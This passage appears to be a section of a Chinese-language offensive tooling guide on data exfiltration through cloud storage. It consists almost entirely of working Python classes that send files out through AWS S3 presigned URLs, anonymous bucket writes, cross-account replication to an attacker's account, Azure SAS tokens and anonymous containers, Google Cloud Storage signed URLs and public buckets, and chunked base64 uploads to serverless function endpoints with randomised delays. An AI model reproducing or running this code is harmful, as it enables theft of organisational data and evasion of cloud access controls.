## §3: 云存储外泄技术 (Cloud Storage Exfiltration)

### 3.1 AWS S3外泄

```python
#!/usr/bin/env python3
"""
AWS S3外泄模块
利用S3存储桶进行数据外泄
策略：使用预签名URL、匿名上传、跨账户复制
"""

import boto3
import os
import time
import random
import base64
import json
from botocore.config import Config
from botocore.exceptions import ClientError
from typing import Optional, List
import hashlib

class AWSS3Exfiltrator:
    """AWS S3外泄器"""

    def __init__(self, aws_access_key: str = None, aws_secret_key: str = None,
                 region: str = "us-east-1", session_token: str = None):
        self.config = Config(
            region_name=region,
            signature_version='s3v4',
            retries={'max_attempts': 3, 'mode': 'standard'}
        )

        if aws_access_key and aws_secret_key:
            self.client = boto3.client(
                's3',
                aws_access_key_id=aws_access_key,
                aws_secret_access_key=aws_secret_key,
                aws_session_token=session_token,
                config=self.config
            )
        else:
            # 使用默认凭证 (实例角色/环境变量)
            self.client = boto3.client('s3', config=self.config)

    def exfiltrate_to_bucket(self, file_path: str, bucket_name: str,
                             object_key: str = None) -> bool:
        """直接上传到S3存储桶"""
        if object_key is None:
            object_key = os.path.basename(file_path)

        file_size = os.path.getsize(file_path)

        try:
            # 使用分段上传处理大文件
            if file_size > 8 * 1024 * 1024:
                return self._multipart_upload(file_path, bucket_name, object_key)
            else:
                with open(file_path, "rb") as f:
                    self.client.put_object(
                        Bucket=bucket_name,
                        Key=object_key,
                        Body=f,
                        Metadata={
                            "upload-time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                            "file-hash": hashlib.sha256(open(file_path, "rb").read()).hexdigest(),
                        }
                    )
                print(f"[+] 上传成功: s3://{bucket_name}/{object_key}")
                return True

        except ClientError as e:
            print(f"[!] S3上传失败: {e}")
            return False

    def _multipart_upload(self, file_path: str, bucket_name: str, object_key: str) -> bool:
        """分段上传大文件"""
        try:
            mpu = self.client.create_multipart_upload(
                Bucket=bucket_name,
                Key=object_key,
                ServerSideEncryption="AES256",
            )
            upload_id = mpu["UploadId"]

            parts = []
            part_size = 5 * 1024 * 1024  # 5MB per part

            with open(file_path, "rb") as f:
                part_number = 1
                while True:
                    data = f.read(part_size)
                    if not data:
                        break

                    resp = self.client.upload_part(
                        Bucket=bucket_name,
                        Key=object_key,
                        PartNumber=part_number,
                        UploadId=upload_id,
                        Body=data,
                    )
                    parts.append({
                        "PartNumber": part_number,
                        "ETag": resp["ETag"]
                    })
                    part_number += 1

            # 完成分段上传
            self.client.complete_multipart_upload(
                Bucket=bucket_name,
                Key=object_key,
                UploadId=upload_id,
                MultipartUpload={"Parts": parts}
            )

            print(f"[+] 分段上传完成: s3://{bucket_name}/{object_key} ({len(parts)} parts)")
            return True

        except ClientError as e:
            self.client.abort_multipart_upload(
                Bucket=bucket_name, Key=object_key, UploadId=upload_id
            )
            print(f"[!] 分段上传失败: {e}")
            return False

    def exfiltrate_via_presigned_url(self, file_path: str, bucket_name: str,
                                      object_key: str = None) -> Optional[str]:
        """
        通过预签名URL外泄
        优势：不需要AWS凭证即可上传，URL可匿名使用
        """
        if object_key is None:
            object_key = os.path.basename(file_path)

        try:
            # 生成预签名PUT URL
            presigned_url = self.client.generate_presigned_url(
                'put_object',
                Params={
                    'Bucket': bucket_name,
                    'Key': object_key,
                    'ContentType': 'application/octet-stream',
                },
                ExpiresIn=3600,  # 1小时有效期
                HttpMethod='PUT'
            )

            # 使用预签名URL上传
            import requests
            with open(file_path, "rb") as f:
                resp = requests.put(
                    presigned_url,
                    data=f,
                    headers={'Content-Type': 'application/octet-stream'}
                )

            if resp.status_code == 200:
                print(f"[+] 预签名URL上传成功: {object_key}")
                return presigned_url

            return None

        except Exception as e:
            print(f"[!] 预签名URL外泄失败: {e}")
            return None

    def exfiltrate_via_cross_account(self, file_path: str, source_bucket: str,
                                      dest_bucket: str, dest_account: str) -> bool:
        """
        跨账户复制外泄
        利用S3跨账户复制策略将数据复制到攻击者账户
        """
        object_key = os.path.basename(file_path)

        # 首先上传到源桶
        if not self.exfiltrate_to_bucket(file_path, source_bucket, object_key):
            return False

        # 设置跨账户复制策略
        replication_config = {
            "Role": f"arn:aws:iam::{dest_account}:role/s3-replication-role",
            "Rules": [{
                "ID": "exfil-rule",
                "Status": "Enabled",
                "Prefix": "",
                "Destination": {
                    "Bucket": f"arn:aws:s3:::{dest_bucket}",
                    "Account": dest_account,
                }
            }]
        }

        try:
            self.client.put_bucket_replication(
                Bucket=source_bucket,
                ReplicationConfiguration=replication_config
            )
            print(f"[+] 跨账户复制已配置: {source_bucket} -> {dest_bucket}")
            return True
        except ClientError as e:
            print(f"[!] 复制配置失败: {e}")
            return False

    def exfiltrate_via_anonymous_write(self, file_path: str, bucket_name: str) -> bool:
        """
        匿名写入外泄
        利用配置错误的S3存储桶 (允许匿名PutObject)
        """
        import requests

        object_key = os.path.basename(file_path)
        url = f"https://{bucket_name}.s3.amazonaws.com/{object_key}"

        with open(file_path, "rb") as f:
            resp = requests.put(url, data=f)

        if resp.status_code == 200:
            print(f"[+] 匿名上传成功: {url}")
            return True
        else:
            print(f"[!] 匿名上传失败: {resp.status_code}")
            return False
```

### 3.2 Azure Blob Storage外泄

```python
#!/usr/bin/env python3
"""
Azure Blob Storage外泄模块
利用Azure Blob进行数据外泄
策略：SAS Token、匿名Blob容器、共享访问签名
"""

from azure.storage.blob import BlobServiceClient, BlobClient, ContainerClient
from azure.storage.blob import generate_blob_sas, BlobSasPermissions
from azure.identity import DefaultAzureCredential, ClientSecretCredential
import os
import time
import random
import base64
from datetime import datetime, timedelta
from typing import Optional

class AzureBlobExfiltrator:
    """Azure Blob外泄器"""

    def __init__(self, connection_string: str = None, account_url: str = None):
        if connection_string:
            self.blob_service = BlobServiceClient.from_connection_string(connection_string)
        elif account_url:
            credential = DefaultAzureCredential()
            self.blob_service = BlobServiceClient(account_url=account_url, credential=credential)
        else:
            raise ValueError("需要connection_string或account_url")

    def exfiltrate_to_container(self, file_path: str, container_name: str,
                                 blob_name: str = None) -> bool:
        """上传到Blob容器"""
        if blob_name is None:
            blob_name = os.path.basename(file_path)

        try:
            blob_client = self.blob_service.get_blob_client(
                container=container_name, blob=blob_name
            )

            with open(file_path, "rb") as f:
                blob_client.upload_blob(f, overwrite=True)

            print(f"[+] Blob上传成功: {container_name}/{blob_name}")
            return True

        except Exception as e:
            print(f"[!] Blob上传失败: {e}")
            return False

    def exfiltrate_via_sas_token(self, file_path: str, container_name: str,
                                  blob_name: str = None) -> Optional[str]:
        """通过SAS Token外泄"""
        if blob_name is None:
            blob_name = os.path.basename(file_path)

        try:
            # 生成SAS Token
            sas_token = generate_blob_sas(
                account_name=self.blob_service.account_name,
                container_name=container_name,
                blob_name=blob_name,
                account_key=self.blob_service.credential.account_key,
                permission=BlobSasPermissions(write=True, create=True),
                expiry=datetime.utcnow() + timedelta(hours=24),
            )

            sas_url = f"https://{self.blob_service.account_name}.blob.core.windows.net/{container_name}/{blob_name}?{sas_token}"

            # 使用SAS URL上传
            import requests
            with open(file_path, "rb") as f:
                resp = requests.put(
                    sas_url,
                    data=f,
                    headers={
                        "x-ms-blob-type": "BlockBlob",
                        "Content-Type": "application/octet-stream",
                    }
                )

            if resp.status_code == 201:
                print(f"[+] SAS上传成功: {blob_name}")
                return sas_url
            return None

        except Exception as e:
            print(f"[!] SAS外泄失败: {e}")
            return None

    def exfiltrate_via_anonymous_container(self, file_path: str, container_name: str) -> bool:
        """匿名Blob容器外泄"""
        import requests

        blob_name = os.path.basename(file_path)
        url = f"https://{self.blob_service.account_name}.blob.core.windows.net/{container_name}/{blob_name}"

        with open(file_path, "rb") as f:
            resp = requests.put(
                url,
                data=f,
                headers={
                    "x-ms-blob-type": "BlockBlob",
                    "Content-Type": "application/octet-stream",
                }
            )

        return resp.status_code == 201
```

### 3.3 Google Cloud Storage外泄

```python
#!/usr/bin/env python3
"""
Google Cloud Storage外泄模块
利用GCS进行数据外泄
策略：服务账号密钥、签名URL、匿名可写桶
"""

from google.cloud import storage
from google.oauth2 import service_account
import os
import time
import random
import base64
from datetime import datetime, timedelta
from typing import Optional

class GCSExfiltrator:
    """Google Cloud Storage外泄器"""

    def __init__(self, credentials_path: str = None, project_id: str = None):
        if credentials_path:
            credentials = service_account.Credentials.from_service_account_file(credentials_path)
            self.client = storage.Client(project=project_id, credentials=credentials)
        else:
            self.client = storage.Client()

    def exfiltrate_to_bucket(self, file_path: str, bucket_name: str,
                              blob_name: str = None) -> bool:
        """上传到GCS桶"""
        if blob_name is None:
            blob_name = os.path.basename(file_path)

        try:
            bucket = self.client.bucket(bucket_name)
            blob = bucket.blob(blob_name)

            # 分块上传
            blob.chunk_size = 5 * 1024 * 1024  # 5MB

            with open(file_path, "rb") as f:
                blob.upload_from_file(f)

            print(f"[+] GCS上传成功: gs://{bucket_name}/{blob_name}")
            return True

        except Exception as e:
            print(f"[!] GCS上传失败: {e}")
            return False

    def exfiltrate_via_signed_url(self, file_path: str, bucket_name: str,
                                   blob_name: str = None) -> Optional[str]:
        """通过签名URL外泄"""
        if blob_name is None:
            blob_name = os.path.basename(file_path)

        try:
            bucket = self.client.bucket(bucket_name)
            blob = bucket.blob(blob_name)

            signed_url = blob.generate_signed_url(
                version="v4",
                expiration=timedelta(hours=24),
                method="PUT",
                content_type="application/octet-stream",
            )

            import requests
            with open(file_path, "rb") as f:
                resp = requests.put(
                    signed_url,
                    data=f,
                    headers={"Content-Type": "application/octet-stream"}
                )

            if resp.status_code == 200:
                print(f"[+] GCS签名URL上传成功: {blob_name}")
                return signed_url
            return None

        except Exception as e:
            print(f"[!] 签名URL外泄失败: {e}")
            return None

    def exfiltrate_via_public_bucket(self, file_path: str, bucket_name: str) -> bool:
        """公开桶外泄"""
        import requests

        blob_name = os.path.basename(file_path)
        url = f"https://storage.googleapis.com/{bucket_name}/{blob_name}"

        with open(file_path, "rb") as f:
            resp = requests.put(url, data=f)

        return resp.status_code == 200
```

### 3.4 2026 Serverless函数外泄

```python
#!/usr/bin/env python3
"""
Serverless函数外泄模块 (2026)
利用Serverless函数作为数据中转站
策略：AWS Lambda / Azure Functions / GCP Cloud Functions
"""

import requests
import json
import base64
import os
import time
import random
import hashlib
from typing import Optional

class ServerlessExfiltrator:
    """
    Serverless函数外泄器
    利用云函数URL作为数据接收端点
    """

    def __init__(self, function_url: str, api_key: str = None):
        self.function_url = function_url
        self.api_key = api_key
        self.session = requests.Session()

        if api_key:
            self.session.headers.update({"x-api-key": api_key})

    def exfiltrate_via_lambda(self, file_path: str) -> bool:
        """通过AWS Lambda函数URL外泄"""
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)

        with open(file_path, "rb") as f:
            data = f.read()

        # 分块 (Lambda payload限制: 6MB)
        chunk_size = 1024 * 1024 * 5  # 5MB
        chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
        total_chunks = len(chunks)

        session_id = hashlib.md5(f"{file_name}{time.time()}".encode()).hexdigest()[:8]

        for idx, chunk in enumerate(chunks):
            encoded = base64.b64encode(chunk).decode()

            payload = {
                "session_id": session_id,
                "file_name": file_name,
                "chunk_index": idx,
                "total_chunks": total_chunks,
                "data": encoded,
                "checksum": hashlib.md5(chunk).hexdigest(),
            }

            resp = self.session.post(
                self.function_url,
                json=payload,
                timeout=30
            )

            if resp.status_code != 200:
                print(f"[!] Chunk {idx + 1} failed: {resp.status_code}")
                return False

            if idx % 5 == 0:
                print(f"[+] Lambda外泄: {idx + 1}/{total_chunks} chunks")

            time.sleep(random.uniform(0.1, 0.5))

        # 发送完成信号
        complete_payload = {
            "session_id": session_id,
            "action": "complete",
            "total_chunks": total_chunks,
            "original_size": file_size,
        }
        self.session.post(self.function_url, json=complete_payload)

        print(f"[+] Serverless外泄完成: {file_name}")
        return True

    def exfiltrate_via_streaming(self, file_path: str) -> bool:
        """流式传输外泄 (适用于大文件)"""
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)

        session_id = hashlib.md5(f"{file_name}{time.time()}".encode()).hexdigest()[:8]

        # 初始化流式传输
        init_resp = self.session.post(
            self.function_url,
            json={
                "action": "init_stream",
                "session_id": session_id,
                "file_name": file_name,
                "file_size": file_size,
            }
        )

        if init_resp.status_code != 200:
            return False

        with open(file_path, "rb") as f:
            chunk_idx = 0
            while True:
                chunk = f.read(1024 * 64)  # 64KB chunks
                if not chunk:
                    break

                encoded = base64.b64encode(chunk).decode()
                resp = self.session.post(
                    self.function_url,
                    json={
                        "action": "stream_chunk",
                        "session_id": session_id,
                        "chunk_index": chunk_idx,
                        "data": encoded,
                    },
                    timeout=30
                )

                chunk_idx += 1
                time.sleep(0.01)

        return True
```

---

